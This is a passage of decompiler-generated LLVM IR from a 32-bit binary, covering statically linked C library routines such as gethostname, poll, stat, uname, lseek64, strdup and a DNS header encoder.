  store i32 %v0_8067c6d, i32* %v5_8067c6d, align 4
  %v0_8067c71 = load i32, i32* @esi, align 4
  %v1_8067c71 = add i32 %v0_8067c71, 4
  store i32 %v1_8067c71, i32* @esi, align 4
  %v0_8067c74 = load i32, i32* %eax.global-to-local, align 4
  %v1_8067c74 = add i32 %v0_8067c74, 1
  store i32 %v1_8067c74, i32* %eax.global-to-local, align 4
  %v15_8067c75 = icmp eq i32 %v1_8067c74, 0
  br i1 %v15_8067c75, label %dec_label_pc_8067c6d, label %dec_label_pc_8067c7b

dec_label_pc_8067c7b:                             ; preds = %dec_label_pc_8067c6d
  %phitmp = mul i32 %v1_8067c74, 4
  %v3_8067c7b = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_8067c7b, i32* @ebx, align 4
  %v0_8067c7f = load i32, i32* @ebp, align 4
  %v3_8067c7f = add i32 %v0_8067c7f, %phitmp
  %v4_8067c7f = inttoptr i32 %v3_8067c7f to i32*
  store i32 0, i32* %v4_8067c7f, align 4
  %v1_8067c87 = icmp eq i32 %v3_8067c7b, 0
  br i1 %v1_8067c87, label %dec_label_pc_8067cad, label %dec_label_pc_8067c8b

dec_label_pc_8067c8b:                             ; preds = %dec_label_pc_8067c7b
  %v5_8067c8e = inttoptr i32 %v3_8067c7b to i8*
  %v3_8067c8f = call i32 @strlen(i8* %v5_8067c8e)
  store i32 %v3_8067c8f, i32* @eax, align 4
  %tmp52 = icmp ugt i32 %v2_8067c41, %v3_8067c8f
  br i1 %tmp52, label %dec_label_pc_8067c9d, label %dec_label_pc_8067cad

dec_label_pc_8067c9d:                             ; preds = %dec_label_pc_8067c8b
  %v0_8067ca0 = load i32, i32* @esi, align 4
  %v5_8067ca0 = inttoptr i32 %v0_8067ca0 to i8*
  %v5_8067ca1 = call i32 @strcpy(i8* %v5_8067ca0, i32 %v3_8067c7b)
  %v0_8067ca6 = load i32, i32* @esi, align 4
  br label %dec_label_pc_8067cb1

dec_label_pc_8067cad:                             ; preds = %dec_label_pc_8067c8b, %dec_label_pc_8067c7b
  br label %dec_label_pc_8067cb1

dec_label_pc_8067cb1:                             ; preds = %dec_label_pc_8067c9d, %dec_label_pc_8067cad
  %storemerge = phi i32 [ %arg3, %dec_label_pc_8067cad ], [ %v0_8067ca6, %dec_label_pc_8067c9d ]
  %v0_8067cbb = phi i32 [ %arg3, %dec_label_pc_8067cad ], [ %v0_8067ca6, %dec_label_pc_8067c9d ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  store i32 %arg5, i32* %ecx.global-to-local, align 4
  %v2_8067cbb = inttoptr i32 %arg2 to i32*
  store i32 %v0_8067cbb, i32* %v2_8067cbb, align 4
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v0_8067cc1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067cc1 = add i32 %v0_8067cc1, 8
  %v2_8067cc1 = inttoptr i32 %v1_8067cc1 to i32*
  store i32 2, i32* %v2_8067cc1, align 4
  %v0_8067cc8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067cc8 = add i32 %v0_8067cc8, 12
  %v2_8067cc8 = inttoptr i32 %v1_8067cc8 to i32*
  store i32 4, i32* %v2_8067cc8, align 4
  %v0_8067ccf = load i32, i32* @edi, align 4
  %v1_8067ccf = load i32, i32* %edx.global-to-local, align 4
  %v2_8067ccf = add i32 %v1_8067ccf, 4
  %v3_8067ccf = inttoptr i32 %v2_8067ccf to i32*
  store i32 %v0_8067ccf, i32* %v3_8067ccf, align 4
  %v0_8067cd2 = load i32, i32* @ebp, align 4
  %v1_8067cd2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067cd2 = add i32 %v1_8067cd2, 16
  %v3_8067cd2 = inttoptr i32 %v2_8067cd2 to i32*
  store i32 %v0_8067cd2, i32* %v3_8067cd2, align 4
  %v0_8067cd5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8067cd5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8067cd5 = inttoptr i32 %v1_8067cd5 to i32*
  store i32 %v0_8067cd5, i32* %v2_8067cd5, align 4
  %v0_8067cd7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8067cd7 = inttoptr i32 %v0_8067cd7 to i32*
  store i32 0, i32* %v1_8067cd7, align 4
  br label %dec_label_pc_8067cfa

dec_label_pc_8067cdf:                             ; preds = %dec_label_pc_8067c18
  store i32 %arg6, i32* %edx.global-to-local, align 4
  store i32 2, i32* @esi, align 4
  store i32 -4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8067ac4, align 4
  %v0_8067cf3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8067cf3 = inttoptr i32 %v0_8067cf3 to i32*
  store i32 1, i32* %v1_8067cf3, align 4
  br label %dec_label_pc_8067cfa

dec_label_pc_8067cfa:                             ; preds = %dec_label_pc_8067c23, %dec_label_pc_8067cb1, %dec_label_pc_8067cdf
  %v3_8067cfd = load i32, i32* %stack_var_-60, align 4
  %v2_8067d01 = call i32 @free(i32 %v3_8067cfd)
  store i32 %v3_8067cfd, i32* %eax.global-to-local, align 4
  %v3_8067d07 = load i32, i32* %stack_var_-20, align 4
  %v2_8067d0b = call i32 @free(i32 %v3_8067d07)
  store i32 %v2_8067d0b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067d1a

dec_label_pc_8067d15:                             ; preds = %dec_label_pc_8067b23, %dec_label_pc_8067af7
  store i32 34, i32* @esi, align 4
  br label %dec_label_pc_8067d1a

dec_label_pc_8067d1a:                             ; preds = %dec_label_pc_8067ae6, %dec_label_pc_8067ad0, %entry, %dec_label_pc_8067cfa, %dec_label_pc_8067c0e, %dec_label_pc_8067b84, %dec_label_pc_8067ab8, %dec_label_pc_8067d15
  %v0_8067d1d = load i32, i32* @esi, align 4
  store i32 %v0_8067d1d, i32* %eax.global-to-local, align 4
  store i32 %v0_8067a68, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8067d1d

; uselistorder directives
  uselistorder i32 %v3_8067c7b, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8067c74, { 0, 2, 1 }
  uselistorder i32 %v1_8067c71, { 1, 0 }
  uselistorder i32 %v2_8067c41, { 0, 2, 1 }
  uselistorder i32 %v1_8067b40, { 2, 1, 0 }
  uselistorder i32 %v0_8067b1b, { 1, 0 }
  uselistorder i32 %v1_8067b18, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8067ade, { 1, 0 }
  uselistorder i32 %v2_8067ac4, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8067ac4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 0, 11, 10, 1, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 (i32)* @free, { 26, 25, 24, 23, 22, 21, 19, 12, 11, 10, 9, 8, 7, 6, 18, 17, 16, 15, 5, 4, 3, 2, 14, 13, 20, 35, 27, 34, 33, 32, 1, 31, 30, 29, 28, 0 }
  uselistorder i32 (i8*, i32)* @memmove, { 1, 0 }
  uselistorder i32 -20, { 1, 2, 4, 5, 0, 3 }
  uselistorder i32 255, { 8, 13, 9, 6, 10, 1, 0, 7, 11, 12, 14, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder i32 %arg6, { 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 %arg5, { 3, 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 6, 5, 2, 4, 3 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8067d1a, { 7, 3, 4, 5, 0, 1, 6, 2 }
  uselistorder label %dec_label_pc_8067cfa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8067cb1, { 1, 0 }
  uselistorder label %dec_label_pc_8067c6d, { 1, 0 }
  uselistorder label %dec_label_pc_8067c0e, { 1, 0 }
  uselistorder label %dec_label_pc_8067af7, { 1, 2, 0 }
}

define i32 @__GI_gethostname() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-329 = alloca i32, align 4
  %stack_var_-394 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8067d24 = load i32, i32* @ebx, align 4
  store i32 %v0_8067d24, i32* %stack_var_-4, align 4
  %v2_8067d2b = ptrtoint i32* %stack_var_-394 to i32
  %v2_8067d30 = call i32 @uname(i32 %v2_8067d2b)
  %v8_8067d3b = icmp eq i32 %v2_8067d30, -1
  br i1 %v8_8067d3b, label %dec_label_pc_8067d7d, label %dec_label_pc_8067d3e

dec_label_pc_8067d3e:                             ; preds = %entry
  %tmp17 = bitcast i32* %stack_var_-329 to i8*
  %v3_8067d46 = call i32 @strlen(i8* %tmp17)
  %v1_8067d4e = add i32 %v3_8067d46, 1
  store i32 %v1_8067d4e, i32* @eax, align 4
  %tmp21 = icmp ugt i32 %v1_8067d4e, %tmp6
  br i1 %tmp21, label %dec_label_pc_8067d58, label %dec_label_pc_8067d69

dec_label_pc_8067d58:                             ; preds = %dec_label_pc_8067d3e
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8067d7d

dec_label_pc_8067d69:                             ; preds = %dec_label_pc_8067d3e
  %v2_8067d41 = ptrtoint i32* %stack_var_-329 to i32
  %v4_8067d73 = call i32 @strcpy(i8* %tmp, i32 %v2_8067d41)
  br label %dec_label_pc_8067d7d

dec_label_pc_8067d7d:                             ; preds = %entry, %dec_label_pc_8067d58, %dec_label_pc_8067d69
  %v0_8067d83 = phi i32 [ -1, %entry ], [ -1, %dec_label_pc_8067d58 ], [ 0, %dec_label_pc_8067d69 ]
  %v2_8067d85 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8067d85, i32* @ebx, align 4
  ret i32 %v0_8067d83

; uselistorder directives
  uselistorder i32* %stack_var_-329, { 1, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9 }
  uselistorder i32 22, { 11, 12, 14, 4, 3, 15, 13, 7, 6, 19, 5, 9, 8, 10, 18, 16, 17, 1, 2, 0 }
  uselistorder label %dec_label_pc_8067d7d, { 2, 1, 0 }
}

define i32 @__syscall_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8067d89 = load i32, i32* @ebx, align 4
  store i32 %v0_8067d89, i32* %stack_var_-8, align 4
  %v0_8067d8a = load i32, i32* @edx, align 4
  %v0_8067d8c = load i32, i32* @ecx, align 4
  %v0_8067d91 = load i32, i32* @eax, align 4
  %v1_8067d91 = inttoptr i32 %v0_8067d91 to %pollfd*
  %v5_8067d98 = call i32 @poll(%pollfd* %v1_8067d91, i32 %v0_8067d8a, i32 %v0_8067d8c)
  %tmp = icmp ult i32 %v5_8067d98, -4095
  br i1 %tmp, label %dec_label_pc_8067db2, label %dec_label_pc_8067da5

dec_label_pc_8067da5:                             ; preds = %entry
  %v1_8067daa = sub i32 0, %v5_8067d98
  store i32 %v1_8067daa, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8067db2

dec_label_pc_8067db2:                             ; preds = %entry, %dec_label_pc_8067da5
  %v0_8067db4 = phi i32 [ %v5_8067d98, %entry ], [ -1, %dec_label_pc_8067da5 ]
  %v2_8067db2 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8067db2, i32* @ebx, align 4
  ret i32 %v0_8067db4

; uselistorder directives
  uselistorder i32 %v5_8067d98, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8067db2, { 1, 0 }
}

define i32 @__GI_poll() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8067db5 = load i32, i32* @ebp, align 4
  %v0_8067db6 = load i32, i32* @edi, align 4
  %v0_8067db7 = load i32, i32* @esi, align 4
  %v0_8067db8 = load i32, i32* @ebx, align 4
  store i32 %tmp6, i32* %ebp.global-to-local, align 4
  store i32 %tmp5, i32* %edi.global-to-local, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8067dc8 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8067dce = icmp eq i32 %v0_8067dc8, 0
  %v1_8067dd0 = icmp eq i1 %v1_8067dce, false
  br i1 %v1_8067dd0, label %entry.dec_label_pc_8067de1_crit_edge, label %dec_label_pc_8067dd2

entry.dec_label_pc_8067de1_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8067de1

dec_label_pc_8067dd2:                             ; preds = %entry
  store i32 %tmp, i32* @ecx, align 4
  store i32 %v0_8067db8, i32* @ebx, align 4
  store i32 %tmp5, i32* @edx, align 4
  store i32 %tmp6, i32* @eax, align 4
  store i32 %v0_8067db6, i32* %edi.global-to-local, align 4
  store i32 %v0_8067db5, i32* %ebp.global-to-local, align 4
  %v3_8067ddf = call i32 @__syscall_poll(i32 %v0_8067db8, i32 %v0_8067db7, i32 %v0_8067db6)
  br label %dec_label_pc_8067de1

dec_label_pc_8067de1:                             ; preds = %entry.dec_label_pc_8067de1_crit_edge, %dec_label_pc_8067dd2
  %v4_8067de1 = call i32 @__libc_enable_asynccancel(i32 %v0_8067db8, i32 %v0_8067db7, i32 %v0_8067db6, i32 %v0_8067db5)
  %v0_8067de6 = load i32, i32* @ebx, align 4
  store i32 %v0_8067de6, i32* @ecx, align 4
  %v0_8067de8 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8067de8, i32* @edx, align 4
  store i32 %v4_8067de1, i32* @esi, align 4
  %v0_8067dec = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8067dec, i32* @eax, align 4
  %v3_8067dee = call i32 @__syscall_poll(i32 %v0_8067db8, i32 %v0_8067db7, i32 %v0_8067db6)
  store i32 %v3_8067dee, i32* @ebx, align 4
  %v0_8067df5 = load i32, i32* @esi, align 4
  store i32 %v0_8067df5, i32* @eax, align 4
  %v1_8067df7 = call i32 @__libc_disable_asynccancel(i32 %v0_8067db8)
  %v0_8067dff = load i32, i32* @ebx, align 4
  store i32 %v0_8067db8, i32* @ebx, align 4
  store i32 %v0_8067db7, i32* @esi, align 4
  store i32 %v0_8067db6, i32* @edi, align 4
  store i32 %v0_8067db5, i32* @ebp, align 4
  ret i32 %v0_8067dff

; uselistorder directives
  uselistorder i32 %v0_8067db8, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8067db7, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8067db6, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8067db5, { 1, 0, 2 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 11, 13, 12, 4, 0, 5, 3, 7, 14, 6, 9, 10, 8, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_enable_asynccancel, { 11, 13, 12, 4, 0, 5, 3, 7, 14, 6, 9, 10, 8, 1, 2 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 17, 41, 42, 28, 29, 30, 31, 32, 33, 24, 25, 26, 27, 34, 35, 15, 16, 0, 1, 36, 37, 38, 39, 18, 19, 20, 21, 22, 23, 5, 6, 7, 8, 9, 10, 11, 12, 51, 52, 53, 47, 50, 55, 48, 2, 3, 13, 14, 4, 49, 45, 40, 43, 44, 54, 46, 57, 56 }
  uselistorder label %dec_label_pc_8067de1, { 1, 0 }
}

define i32 @__GI_stat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8067e08 = load i32, i32* @ebx, align 4
  store i32 %v0_8067e08, i32* %stack_var_-4, align 4
  %tmp10 = bitcast i32* %stack_var_-100 to %stat64*
  %v6_8067e1b = call i32 @stat64(i8* %arg1, %stat64* %tmp10)
  %tmp = icmp ult i32 %v6_8067e1b, -4095
  br i1 %tmp, label %dec_label_pc_8067e37, label %dec_label_pc_8067e28

dec_label_pc_8067e28:                             ; preds = %entry
  %v1_8067e2d = sub i32 0, %v6_8067e1b
  store i32 -1, i32* @ebx, align 4
  store i32 %v1_8067e2d, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8067e4c

dec_label_pc_8067e37:                             ; preds = %entry
  %v1_8067e37 = icmp eq i32 %v6_8067e1b, 0
  store i32 %v6_8067e1b, i32* @ebx, align 4
  %v1_8067e3b = icmp eq i1 %v1_8067e37, false
  br i1 %v1_8067e3b, label %dec_label_pc_8067e4c, label %dec_label_pc_8067e3d

dec_label_pc_8067e3d:                             ; preds = %dec_label_pc_8067e37
  %v5_8067e44 = call i32 @__xstat32_conv(i32* nonnull %stack_var_-100, i32 %arg2, i32 %v6_8067e1b, i32 %v6_8067e1b)
  br label %dec_label_pc_8067e4c

dec_label_pc_8067e4c:                             ; preds = %dec_label_pc_8067e37, %dec_label_pc_8067e28, %dec_label_pc_8067e3d
  %v0_8067e4f = load i32, i32* @ebx, align 4
  %v2_8067e51 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8067e51, i32* @ebx, align 4
  ret i32 %v0_8067e4f

; uselistorder directives
  uselistorder i32 %v6_8067e1b, { 1, 2, 5, 4, 3, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @__xstat32_conv, { 1, 0 }
  uselistorder label %dec_label_pc_8067e4c, { 2, 0, 1 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8067e5f = call i32 @uname(i32 ptrtoint (i32* @0 to i32))
  %tmp = icmp ult i32 %v1_8067e5f, -4095
  br i1 %tmp, label %dec_label_pc_8067e7a, label %dec_label_pc_8067e6d

dec_label_pc_8067e6d:                             ; preds = %entry
  %v1_8067e72 = sub i32 0, %v1_8067e5f
  store i32 %v1_8067e72, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8067e7a

dec_label_pc_8067e7a:                             ; preds = %entry, %dec_label_pc_8067e6d
  %v0_8067e7a = phi i32 [ %v1_8067e5f, %entry ], [ -1, %dec_label_pc_8067e6d ]
  ret i32 %v0_8067e7a

; uselistorder directives
  uselistorder i32 %v1_8067e5f, { 1, 2, 0 }
  uselistorder i32 (i32)* @uname, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 107, 108, 102, 103, 104, 105, 106, 101 }
  uselistorder label %dec_label_pc_8067e7a, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8067e7e = load i32, i32* @ebx, align 4
  store i32 %v0_8067e7e, i32* %stack_var_-12, align 4
  %v1_8067ea0 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8067ea0, i32* @ecx, align 4
  %tmp16 = icmp ult i32 %v1_8067ea0, -4095
  br i1 %tmp16, label %dec_label_pc_8067ebb, label %dec_label_pc_8067eac

dec_label_pc_8067eac:                             ; preds = %entry
  %v1_8067eb1 = sub i32 0, %v1_8067ea0
  store i32 %v1_8067eb1, i32* @ecx, align 4
  store i32 %v1_8067eb1, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8067ebf

dec_label_pc_8067ebb:                             ; preds = %entry
  %v1_8067ebb = icmp eq i32 %v1_8067ea0, 0
  br i1 %v1_8067ebb, label %dec_label_pc_8067ec2, label %dec_label_pc_8067ebf

dec_label_pc_8067ebf:                             ; preds = %dec_label_pc_8067ebb, %dec_label_pc_8067eac
  %v0_8067ebf = phi i32 [ %v1_8067ea0, %dec_label_pc_8067ebb ], [ -1, %dec_label_pc_8067eac ]
  %v1_8067ebf = ashr i32 %v0_8067ebf, 31
  br label %dec_label_pc_8067eca

dec_label_pc_8067ec2:                             ; preds = %dec_label_pc_8067ebb
  %v3_8067ec2 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8067eca

dec_label_pc_8067eca:                             ; preds = %dec_label_pc_8067ebf, %dec_label_pc_8067ec2
  %v0_8067ed0 = phi i32 [ %v0_8067ebf, %dec_label_pc_8067ebf ], [ %v3_8067ec2, %dec_label_pc_8067ec2 ]
  %storemerge = phi i32 [ %v1_8067ebf, %dec_label_pc_8067ebf ], [ %tmp, %dec_label_pc_8067ec2 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_8067ecd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8067ecd, i32* @ebx, align 4
  ret i32 %v0_8067ed0

; uselistorder directives
  uselistorder i32 %v1_8067ea0, { 1, 2, 3, 0, 4 }
  uselistorder i32 31, { 11, 6, 12, 13, 14, 15, 2, 7, 8, 1, 10, 3, 16, 17, 9, 4, 5, 0 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 39, 40, 32, 33, 37, 38, 41, 42, 34, 35, 15, 16, 36, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* @ecx, { 65, 66, 67, 69, 68, 104, 77, 88, 89, 21, 92, 91, 4, 8, 90, 5, 9, 109, 110, 30, 32, 31, 111, 112, 113, 114, 115, 116, 22, 117, 33, 23, 34, 232, 233, 234, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 64, 6, 44, 0, 45, 7, 56, 1, 118, 119, 98, 99, 93, 94, 95, 96, 97, 100, 101, 102, 103, 57, 120, 121, 10, 122, 123, 124, 125, 126, 127, 128, 129, 130, 24, 131, 132, 105, 106, 107, 108, 236, 237, 238, 239, 70, 71, 72, 133, 134, 11, 135, 136, 137, 55, 58, 59, 60, 61, 12, 62, 63, 35, 36, 37, 38, 183, 46, 47, 48, 242, 49, 50, 243, 261, 39, 51, 52, 53, 240, 241, 28, 13, 73, 74, 75, 76, 19, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 14, 205, 184, 185, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 15, 222, 223, 224, 226, 227, 228, 229, 225, 40, 176, 177, 178, 179, 180, 181, 25, 230, 26, 235, 138, 139, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 20, 152, 153, 154, 140, 155, 156, 16, 17, 2, 3, 157, 158, 18, 159, 160, 161, 27, 162, 163, 164, 166, 167, 168, 169, 170, 171, 172, 29, 165, 173, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 174, 175, 182, 41, 42, 260, 43, 54, 231 }
  uselistorder label %dec_label_pc_8067eca, { 1, 0 }
}

define i32 @__GI_strdup() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8067ed4 = load i32, i32* @edi, align 4
  %v0_8067ed5 = load i32, i32* @esi, align 4
  %v0_8067ed6 = load i32, i32* @ebx, align 4
  store i32 %v0_8067ed6, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* @edi, align 4
  %v5_8067ede = inttoptr i32 %tmp to i8*
  %v3_8067edf = call i32 @strlen(i8* %v5_8067ede)
  %v1_8067ee4 = add i32 %v3_8067edf, 1
  store i32 %v1_8067ee4, i32* @esi, align 4
  %v2_8067eea = call i32 @malloc(i32 %v1_8067ee4)
  %v2_8067ef2 = icmp eq i32 %v2_8067eea, 0
  store i32 %v2_8067eea, i32* %ebx.global-to-local, align 4
  br i1 %v2_8067ef2, label %dec_label_pc_8067f04, label %dec_label_pc_8067ef8

dec_label_pc_8067ef8:                             ; preds = %entry
  %v0_8067ef9 = load i32, i32* @esi, align 4
  %v0_8067efa = load i32, i32* @edi, align 4
  %v5_8067efb = inttoptr i32 %v2_8067eea to i8*
  %v5_8067efc = call i32 @memcpy(i8* %v5_8067efb, i32 %v0_8067efa, i32 %v0_8067ef9)
  %v0_8067f04.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8067f04

dec_label_pc_8067f04:                             ; preds = %entry, %dec_label_pc_8067ef8
  %v0_8067f04 = phi i32 [ 0, %entry ], [ %v0_8067f04.pre, %dec_label_pc_8067ef8 ]
  %v2_8067f06 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8067f06, i32* @ebx, align 4
  store i32 %v0_8067ed5, i32* @esi, align 4
  store i32 %v0_8067ed4, i32* @edi, align 4
  ret i32 %v0_8067f04

; uselistorder directives
  uselistorder i32 %v2_8067eea, { 1, 2, 0 }
  uselistorder i32 (i32)* @malloc, { 12, 11, 10, 4, 3, 9, 8, 7, 13, 6, 5, 14, 21, 2, 20, 19, 18, 17, 16, 15, 0, 1 }
  uselistorder label %dec_label_pc_8067f04, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %esi.global-to-local, align 4
  %v4_8067f1e = ptrtoint i8* %tmp to i32
  store i32 %v4_8067f1e, i32* %edi.global-to-local, align 4
  %v7_8067f22 = icmp sgt i32 %tmp12, 11
  br i1 %v7_8067f22, label %dec_label_pc_8067f28, label %dec_label_pc_8067fc0

dec_label_pc_8067f28:                             ; preds = %entry
  %v1_8067f28 = add i32 %tmp11, 1
  %v2_8067f28 = inttoptr i32 %v1_8067f28 to i8*
  %v3_8067f28 = load i8, i8* %v2_8067f28, align 1
  store i8 %v3_8067f28, i8* %tmp, align 1
  %v0_8067f2e = load i32, i32* %esi.global-to-local, align 4
  %v1_8067f2e = inttoptr i32 %v0_8067f2e to i32*
  %v2_8067f2e = load i32, i32* %v1_8067f2e, align 4
  %v1_8067f30 = trunc i32 %v2_8067f2e to i8
  %v2_8067f30 = load i32, i32* %edi.global-to-local, align 4
  %v3_8067f30 = add i32 %v2_8067f30, 1
  %v4_8067f30 = inttoptr i32 %v3_8067f30 to i8*
  store i8 %v1_8067f30, i8* %v4_8067f30, align 1
  %v0_8067f33 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067f37 = add i32 %v0_8067f33, 8
  %v2_8067f37 = inttoptr i32 %v1_8067f37 to i32*
  %v3_8067f37 = load i32, i32* %v2_8067f37, align 4
  %v1_8067f54 = mul i32 %v3_8067f37, 8
  %v2_8067f59 = and i32 %v1_8067f54, 120
  store i32 %v2_8067f59, i32* %edx.global-to-local, align 4
  %v1_8067f5f = add i32 %v0_8067f33, 20
  %v2_8067f5f = inttoptr i32 %v1_8067f5f to i32*
  %v3_8067f5f = load i32, i32* %v2_8067f5f, align 4
  %v4_8067f5f = icmp eq i32 %v3_8067f5f, 0
  %v1_8067f63 = icmp eq i1 %v4_8067f5f, false
  %v2_8067f63 = zext i1 %v1_8067f63 to i32
  %v2_8067f66 = or i32 %v2_8067f63, %v1_8067f54
  %v2_8067f6d = or i32 %v2_8067f66, 134
  %v3_8067f6d = trunc i32 %v2_8067f6d to i8
  %v2_8067f6f = load i32, i32* %edi.global-to-local, align 4
  %v3_8067f6f = add i32 %v2_8067f6f, 2
  %v4_8067f6f = inttoptr i32 %v3_8067f6f to i8*
  store i8 %v3_8067f6d, i8* %v4_8067f6f, align 1
  %v0_8067f72 = load i32, i32* %esi.global-to-local, align 4
  %v1_8067f76 = add i32 %v0_8067f72, 28
  %v2_8067f76 = inttoptr i32 %v1_8067f76 to i8*
  %v3_8067f76 = load i8, i8* %v2_8067f76, align 1
  %v5_8067f76 = load i32, i32* %edx.global-to-local, align 4
  %v2_8067f7f = urem i8 %v3_8067f76, 16
  %v7_8067f7f = zext i8 %v2_8067f7f to i32
  %v9_8067f7f = and i32 %v5_8067f76, -256
  %v10_8067f7f = or i32 %v9_8067f7f, %v7_8067f7f
  store i32 %v10_8067f7f, i32* %edx.global-to-local, align 4
  %v2_8067f82 = or i8 %v2_8067f7f, -128
  %v2_8067f84 = load i32, i32* %edi.global-to-local, align 4
  %v3_8067f84 = add i32 %v2_8067f84, 3
  %v4_8067f84 = inttoptr i32 %v3_8067f84 to i8*
  store i8 %v2_8067f82, i8* %v4_8067f84, align 1
  %v0_8067f87 = load i32, i32* %esi.global-to-local, align 4
